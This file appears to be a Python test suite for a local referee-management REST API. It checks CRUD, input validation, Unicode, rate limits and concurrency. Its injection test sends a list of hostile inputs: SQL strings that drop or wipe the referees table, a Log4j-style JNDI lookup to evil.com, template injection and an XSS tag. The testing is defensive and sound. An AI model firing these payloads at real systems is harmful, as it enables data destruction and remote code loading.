#!/usr/bin/env /usr/bin/python3
"""
PARANOID API TEST SUITE FOR REFEREE ENDPOINTS
Tests every conceivable API edge case, security vulnerability, and failure mode
"""

import asyncio
import httpx
import json
import sys
import uuid
import random
import string
import time
from datetime import datetime
from typing import Dict, Any, List, Optional
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent / 'src'))

print("🔥 PARANOID API TEST SUITE - REFEREE ENDPOINTS 🔥")
print("=" * 70)
print("Testing EVERY edge case, attack vector, and failure mode...")
print("=" * 70)


class ParanoidAPITests:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.api_prefix = "/api/v1"
        self.failed_tests = []
        self.passed_tests = []
        self.test_referee_ids = []  # Track for cleanup
        
    def record_result(self, test_name: str, passed: bool, details: str = ""):
        if passed:
            self.passed_tests.append(test_name)
            print(f"  ✅ {test_name}")
        else:
            self.failed_tests.append((test_name, details))
            print(f"  ❌ {test_name}: {details}")
    
    def generate_valid_metrics(self) -> Dict[str, Any]:
        """Generate valid referee metrics for testing"""
        return {
            "name": f"Test Referee {uuid.uuid4().hex[:8]}",
            "email": f"test_{uuid.uuid4().hex[:8]}@example.com",
            "institution": "Test University",
            "time_metrics": {
                "avg_response_time": 3.5,
                "avg_review_time": 21.0,
                "fastest_review": 7.0,
                "slowest_review": 45.0,
                "response_time_std": 1.2,
                "review_time_std": 5.5,
                "on_time_rate": 0.85,
                "consistency_score": 0.8
            },
            "quality_metrics": {
                "avg_quality_score": 7.5,
                "quality_consistency": 0.8,
                "report_thoroughness": 0.85,
                "constructiveness_score": 8.0,
                "technical_accuracy": 7.8,
                "clarity_score": 8.2,
                "actionability_score": 7.6,
                "overall_quality": 7.8
            },
            "workload_metrics": {
                "current_reviews": 2,
                "completed_reviews_30d": 3,
                "completed_reviews_90d": 8,
                "completed_reviews_365d": 25,
                "monthly_average": 2.1,
                "peak_capacity": 5,
                "availability_score": 0.6,
                "burnout_risk_score": 0.3,
                "capacity_utilization": 0.4
            },
            "reliability_metrics": {
                "acceptance_rate": 0.75,
                "completion_rate": 0.92,
                "ghost_rate": 0.08,
                "decline_after_accept_rate": 0.03,
                "reminder_effectiveness": 0.85,
                "communication_score": 0.88,
                "excuse_frequency": 0.15,
                "reliability_score": 0.82
            },
            "expertise_metrics": {
                "expertise_areas": ["machine learning", "optimization"],
                "h_index": 25,
                "recent_publications": 5,
                "citation_count": 1200,
                "years_experience": 10,
                "expertise_score": 0.75
            }
        }
    
    # TEST 1: BASIC CRUD OPERATIONS
    async def test_basic_crud(self, client: httpx.AsyncClient):
        """Test basic Create, Read, Update, Delete operations"""
        print("\n🔧 TEST 1: BASIC CRUD OPERATIONS")
        print("-" * 40)
        
        # Test 1.1: Create valid referee
        valid_data = self.generate_valid_metrics()
        try:
            response = await client.post(
                f"{self.api_prefix}/referees/",
                json=valid_data
            )
            if response.status_code == 201:
                referee_id = response.json()
                self.test_referee_ids.append(referee_id)
                self.record_result("Create valid referee", True)
            else:
                self.record_result("Create valid referee", False, 
                                 f"Status {response.status_code}: {response.text}")
        except Exception as e:
            self.record_result("Create valid referee", False, str(e))
        
        # Test 1.2: Get by ID
        if self.test_referee_ids:
            try:
                response = await client.get(
                    f"{self.api_prefix}/referees/{self.test_referee_ids[0]}"
                )
                if response.status_code == 200:
                    data = response.json()
                    if data["name"] == valid_data["name"]:
                        self.record_result("Get referee by ID", True)
                    else:
                        self.record_result("Get referee by ID", False, "Data mismatch")
                else:
                    self.record_result("Get referee by ID", False, f"Status {response.status_code}")
            except Exception as e:
                self.record_result("Get referee by ID", False, str(e))
        
        # Test 1.3: Get by email
        try:
            response = await client.get(
                f"{self.api_prefix}/referees/by-email/{valid_data['email']}"
            )
            if response.status_code == 200:
                self.record_result("Get referee by email", True)
            else:
                self.record_result("Get referee by email", False, f"Status {response.status_code}")
        except Exception as e:
            self.record_result("Get referee by email", False, str(e))
        
        # Test 1.4: Update referee
        if self.test_referee_ids:
            try:
                update_data = {
                    "name": "Updated Name",
                    "institution": "Updated University"
                }
                response = await client.put(
                    f"{self.api_prefix}/referees/{self.test_referee_ids[0]}",
                    json=update_data
                )
                if response.status_code == 200:
                    self.record_result("Update referee", True)
                else:
                    self.record_result("Update referee", False, f"Status {response.status_code}")
            except Exception as e:
                self.record_result("Update referee", False, str(e))
    
    # TEST 2: INVALID DATA HANDLING
    async def test_invalid_data(self, client: httpx.AsyncClient):
        """Test handling of invalid, malformed, and edge case data"""
        print("\n💣 TEST 2: INVALID DATA HANDLING")
        print("-" * 40)
        
        # Test 2.1: Missing required fields
        invalid_cases = [
            ("Missing name", {"email": "test@example.com"}),
            ("Missing email", {"name": "Test"}),
            ("Empty name", {"name": "", "email": "test@example.com"}),
            ("Invalid email", {"name": "Test", "email": "not-an-email"}),
            ("Null values", {"name": None, "email": None}),
        ]
        
        for test_name, invalid_data in invalid_cases:
            try:
                response = await client.post(
                    f"{self.api_prefix}/referees/",
                    json=invalid_data
                )
                if response.status_code in [400, 422]:  # Bad request or validation error
                    self.record_result(f"Reject {test_name}", True)
                else:
                    self.record_result(f"Reject {test_name}", False, 
                                     f"Accepted invalid data: {response.status_code}")
            except Exception as e:
                self.record_result(f"Reject {test_name}", False, str(e))
        
        # Test 2.2: Invalid metric values
        data = self.generate_valid_metrics()
        invalid_metrics = [
            ("Negative time", lambda d: d["time_metrics"].update({"avg_response_time": -1})),
            ("Rate > 1", lambda d: d["reliability_metrics"].update({"acceptance_rate": 1.5})),
            ("Score > 10", lambda d: d["quality_metrics"].update({"avg_quality_score": 15})),
            ("Negative count", lambda d: d["workload_metrics"].update({"current_reviews": -5})),
            ("NaN value", lambda d: d["time_metrics"].update({"avg_review_time": float('nan')})),
            ("Infinity", lambda d: d["quality_metrics"].update({"clarity_score": float('inf')})),
        ]
        
        for test_name, mutator in invalid_metrics:
            test_data = self.generate_valid_metrics()
            mutator(test_data)
            try:
                response = await client.post(
                    f"{self.api_prefix}/referees/",
                    json=test_data
                )
                # JSON serialization might fail for NaN/Infinity
                if response.status_code in [400, 422]:
                    self.record_result(f"Reject {test_name}", True)
                else:
                    self.record_result(f"Reject {test_name}", False, 
                                     f"Accepted invalid metrics: {response.status_code}")
            except (ValueError, TypeError):
                self.record_result(f"Reject {test_name}", True)  # Failed during serialization
            except Exception as e:
                self.record_result(f"Reject {test_name}", False, str(e))
    
    # TEST 3: EXTREME VALUES
    async def test_extreme_values(self, client: httpx.AsyncClient):
        """Test with extreme but technically valid values"""
        print("\n🎯 TEST 3: EXTREME VALUES")
        print("-" * 40)
        
        # Test 3.1: Maximum string lengths
        extreme_data = self.generate_valid_metrics()
        extreme_data["name"] = "X" * 200  # Max length
        extreme_data["email"] = "a" * 190 + "@test.com"  # Long email
        extreme_data["institution"] = "University " * 50  # Long institution
        
        try:
            response = await client.post(
                f"{self.api_prefix}/referees/",
                json=extreme_data
            )
            if response.status_code == 201:
                self.test_referee_ids.append(response.json())
                self.record_result("Maximum string lengths", True)
            else:
                self.record_result("Maximum string lengths", False, 
                                 f"Status {response.status_code}")
        except Exception as e:
            self.record_result("Maximum string lengths", False, str(e))
        
        # Test 3.2: Boundary values
        boundary_data = self.generate_valid_metrics()
        boundary_data["time_metrics"]["on_time_rate"] = 0.0  # Minimum
        boundary_data["reliability_metrics"]["acceptance_rate"] = 1.0  # Maximum
        boundary_data["quality_metrics"]["avg_quality_score"] = 10.0  # Maximum
        boundary_data["workload_metrics"]["current_reviews"] = 0  # Minimum
        
        try:
            response = await client.post(
                f"{self.api_prefix}/referees/",
                json=boundary_data
            )
            if response.status_code == 201:
                self.test_referee_ids.append(response.json())
                self.record_result("Boundary values", True)
            else:
                self.record_result("Boundary values", False, 
                                 f"Status {response.status_code}")
        except Exception as e:
            self.record_result("Boundary values", False, str(e))
    
    # TEST 4: UNICODE AND SPECIAL CHARACTERS
    async def test_unicode_hell(self, client: httpx.AsyncClient):
        """Test with various Unicode characters and edge cases"""
        print("\n😈 TEST 4: UNICODE HELL")
        print("-" * 40)
        
        unicode_names = [
            "José García-López",  # Spanish
            "François Müller",  # French/German
            "Владимир Петров",  # Russian
            "李明 (Li Ming)",  # Chinese
            "محمد الأحمد",  # Arabic
            "🤯 Emoji Name",  # Emoji
            "Null\x00Byte",  # Null byte
            "Tab\tCharacter",  # Tab
            "New\nLine",  # Newline
        ]
        
        for name in unicode_names:
            try:
                data = self.generate_valid_metrics()
                data["name"] = name
                data["email"] = f"{uuid.uuid4().hex[:8]}@test.com"
                
                response = await client.post(
                    f"{self.api_prefix}/referees/",
                    json=data
                )
                
                if response.status_code == 201:
                    self.test_referee_ids.append(response.json())
                    # Verify it can be retrieved
                    referee_id = response.json()
                    get_response = await client.get(
                        f"{self.api_prefix}/referees/{referee_id}"
                    )
                    if get_response.status_code == 200:
                        retrieved_name = get_response.json()["name"]
                        if retrieved_name == name:
                            self.record_result(f"Unicode: {name[:20]}", True)
                        else:
                            self.record_result(f"Unicode: {name[:20]}", False, 
                                             "Name corrupted")
                    else:
                        self.record_result(f"Unicode: {name[:20]}", False, 
                                         "Failed to retrieve")
                else:
                    self.record_result(f"Unicode: {name[:20]}", False, 
                                     f"Status {response.status_code}")
            except Exception as e:
                self.record_result(f"Unicode: {name[:20]}", False, str(e))
    
    # TEST 5: SQL INJECTION ATTEMPTS
    async def test_sql_injection(self, client: httpx.AsyncClient):
        """Test SQL injection vulnerability"""
        print("\n💉 TEST 5: SQL INJECTION ATTEMPTS")
        print("-" * 40)
        
        injection_attempts = [
            "'; DROP TABLE referees; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM referees WHERE 1=1; --",
            "' UNION SELECT * FROM users --",
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "{{7*7}}",  # Template injection
            "<script>alert('xss')</script>",  # XSS attempt
        ]
        
        for injection in injection_attempts:
            try:
                # Try in name field
                data = self.generate_valid_metrics()
                data["name"] = injection
                data["email"] = f"{uuid.uuid4().hex[:8]}@test.com"
                
                response = await client.post(
                    f"{self.api_prefix}/referees/",
                    json=data
                )
                
                # Should either reject or safely store
                if response.status_code in [201, 400, 422]:
                    if response.status_code == 201:
                        self.test_referee_ids.append(response.json())
                    self.record_result(f"SQL injection defense: {injection[:20]}", True)
                else:
                    self.record_result(f"SQL injection defense: {injection[:20]}", False,
                                     f"Unexpected status: {response.status_code}")
                    
                # Also try in email search
                response = await client.get(
                    f"{self.api_prefix}/referees/by-email/{injection}"
                )
                if response.status_code in [404, 400, 422]:
                    self.record_result(f"Email injection defense: {injection[:20]}", True)
                else:
                    self.record_result(f"Email injection defense: {injection[:20]}", False,
                                     f"Unexpected status: {response.status_code}")
                    
            except Exception as e:
                self.record_result(f"Injection test: {injection[:20]}", True, 
                                 "Exception raised (good)")
    
    # TEST 6: PERFORMANCE AND LIMITS
    async def test_performance_limits(self, client: httpx.AsyncClient):
        """Test API performance and rate limits"""
        print("\n⚡ TEST 6: PERFORMANCE AND LIMITS")
        print("-" * 40)
        
        # Test 6.1: Large payload
        large_data = self.generate_valid_metrics()
        large_data["expertise_metrics"]["expertise_areas"] = ["area"] * 1000  # Large array
        
        try:
            response = await client.post(
                f"{self.api_prefix}/referees/",
                json=large_data,
                timeout=30.0
            )
            if response.status_code in [201, 413, 400]:  # Created or payload too large
                if response.status_code == 201:
                    self.test_referee_ids.append(response.json())
                self.record_result("Large payload handling", True)
            else:
                self.record_result("Large payload handling", False,
                                 f"Status {response.status_code}")
        except Exception as e:
            self.record_result("Large payload handling", False, str(e))
        
        # Test 6.2: Rapid requests
        start_time = time.time()
        request_count = 20
        success_count = 0
        
        for i in range(request_count):
            try:
                data = self.generate_valid_metrics()
                response = await client.post(
                    f"{self.api_prefix}/referees/",
                    json=data,
                    timeout=5.0
                )
                if response.status_code == 201:
                    success_count += 1
                    self.test_referee_ids.append(response.json())
            except:
                pass
        
        elapsed = time.time() - start_time
        rate = request_count / elapsed
        
        if success_count > 0:
            self.record_result(f"Rapid requests ({rate:.1f}/s, {success_count}/{request_count})", 
                             True)
        else:
            self.record_result("Rapid requests", False, "All requests failed")
        
        # Test 6.3: Get top performers with various limits
        for limit in [1, 10, 100, 1000]:
            try:
                response = await client.get(
                    f"{self.api_prefix}/referees/top-performers",
                    params={"limit": limit}
                )
                if response.status_code == 200:
                    results = response.json()
                    if isinstance(results, list) and len(results) <= limit:
                        self.record_result(f"Top performers limit={limit}", True)
                    else:
                        self.record_result(f"Top performers limit={limit}", False,
                                         f"Got {len(results)} results")
                else:
                    self.record_result(f"Top performers limit={limit}", False,
                                     f"Status {response.status_code}")
            except Exception as e:
                self.record_result(f"Top performers limit={limit}", False, str(e))
    
    # TEST 7: ERROR HANDLING
    async def test_error_handling(self, client: httpx.AsyncClient):
        """Test various error conditions"""
        print("\n🚨 TEST 7: ERROR HANDLING")
        print("-" * 40)
        
        # Test 7.1: Non-existent referee
        fake_id = str(uuid.uuid4())
        try:
            response = await client.get(
                f"{self.api_prefix}/referees/{fake_id}"
            )
            if response.status_code == 404:
                self.record_result("404 for non-existent referee", True)
            else:
                self.record_result("404 for non-existent referee", False,
                                 f"Status {response.status_code}")
        except Exception as e:
            self.record_result("404 for non-existent referee", False, str(e))
        
        # Test 7.2: Invalid UUID format
        try:
            response = await client.get(
                f"{self.api_prefix}/referees/not-a-uuid"
            )
            if response.status_code in [400, 422]:
                self.record_result("Invalid UUID rejection", True)
            else:
                self.record_result("Invalid UUID rejection", False,
                                 f"Status {response.status_code}")
        except Exception as e:
            self.record_result("Invalid UUID rejection", False, str(e))
        
        # Test 7.3: Invalid query parameters
        try:
            response = await client.get(
                f"{self.api_prefix}/referees/top-performers",
                params={"limit": -1}
            )
            if response.status_code in [400, 422]:
                self.record_result("Invalid query parameter", True)
            else:
                self.record_result("Invalid query parameter", False,
                                 f"Status {response.status_code}")
        except Exception as e:
            self.record_result("Invalid query parameter", False, str(e))
    
    # TEST 8: CONCURRENT OPERATIONS
    async def test_concurrent_operations(self, client: httpx.AsyncClient):
        """Test concurrent API calls"""
        print("\n🔀 TEST 8: CONCURRENT OPERATIONS")
        print("-" * 40)
        
        # Test 8.1: Concurrent creates with same email
        email = f"concurrent_{uuid.uuid4().hex[:8]}@test.com"
        
        async def create_referee():
            data = self.generate_valid_metrics()
            data["email"] = email
            try:
                response = await client.post(
                    f"{self.api_prefix}/referees/",
                    json=data
                )
                return response.status_code, response.json() if response.status_code == 201 else None
            except Exception as e:
                return None, str(e)
        
        # Launch 5 concurrent requests
        results = await asyncio.gather(*[create_referee() for _ in range(5)])
        
        success_count = sum(1 for status, _ in results if status == 201)
        conflict_count = sum(1 for status, _ in results if status in [409, 400])
        
        # Should have exactly 1 success (unique email constraint)
        if success_count == 1 and conflict_count >= 3:
            self.record_result("Concurrent creates (unique constraint)", True)
            # Track the successful one
            for status, referee_id in results:
                if status == 201 and referee_id:
                    self.test_referee_ids.append(referee_id)
        else:
            self.record_result("Concurrent creates", False,
                             f"{success_count} succeeded, {conflict_count} conflicts")
        
        # Test 8.2: Concurrent reads
        if self.test_referee_ids:
            referee_id = self.test_referee_ids[0]
            
            async def read_referee():
                try:
                    response = await client.get(
                        f"{self.api_prefix}/referees/{referee_id}"
                    )
                    return response.status_code == 200
                except:
                    return False
            
            # Launch 10 concurrent reads
            read_results = await asyncio.gather(*[read_referee() for _ in range(10)])
            
            if all(read_results):
                self.record_result("Concurrent reads", True)
            else:
                self.record_result("Concurrent reads", False,
                                 f"{sum(read_results)}/10 succeeded")
    
    async def run_all_tests(self):
        """Run all paranoid API tests"""
        print("\n🚀 Starting API server tests...")
        print("Make sure the API server is running on http://localhost:8000")
        
        async with httpx.AsyncClient(base_url=self.base_url, timeout=30.0) as client:
            # Check if API is accessible
            try:
                response = await client.get("/health")
                if response.status_code != 200:
                    print("❌ API server not responding at http://localhost:8000")
                    print("Please start the server with: uvicorn src.api.main:app")
                    return False
            except Exception as e:
                print(f"❌ Cannot connect to API: {e}")
                return False
            
            print("✅ API server is running\n")
            
            # Run all test suites
            await self.test_basic_crud(client)
            await self.test_invalid_data(client)
            await self.test_extreme_values(client)
            await self.test_unicode_hell(client)
            await self.test_sql_injection(client)
            await self.test_performance_limits(client)
            await self.test_error_handling(client)
            await self.test_concurrent_operations(client)
            
            # Cleanup created referees
            if self.test_referee_ids:
                print(f"\n🧹 Created {len(self.test_referee_ids)} test referees")
        
        # Final report
        print("\n" + "=" * 70)
        print("🎯 PARANOID API TEST RESULTS")
        print("=" * 70)
        
        total_tests = len(self.passed_tests) + len(self.failed_tests)
        
        print(f"\nTotal tests: {total_tests}")
        print(f"Passed: {len(self.passed_tests)} ({len(self.passed_tests)/total_tests*100:.1f}%)")
        print(f"Failed: {len(self.failed_tests)} ({len(self.failed_tests)/total_tests*100:.1f}%)")
        
        if self.failed_tests:
            print("\n❌ FAILED TESTS:")
            for test, details in self.failed_tests:
                print(f"  - {test}: {details}")
            print("\n⚠️  API NEEDS ATTENTION!")
        else:
            print("\n🎉 ALL PARANOID API TESTS PASSED!")
            print("✅ API is secure against:")
            print("  - Invalid data")
            print("  - SQL injection")
            print("  - Unicode edge cases")
            print("  - Concurrent operations")
            print("  - Performance issues")
        
        return len(self.failed_tests) == 0


if __name__ == "__main__":
    suite = ParanoidAPITests()
    success = asyncio.run(suite.run_all_tests())
    sys.exit(0 if success else 1)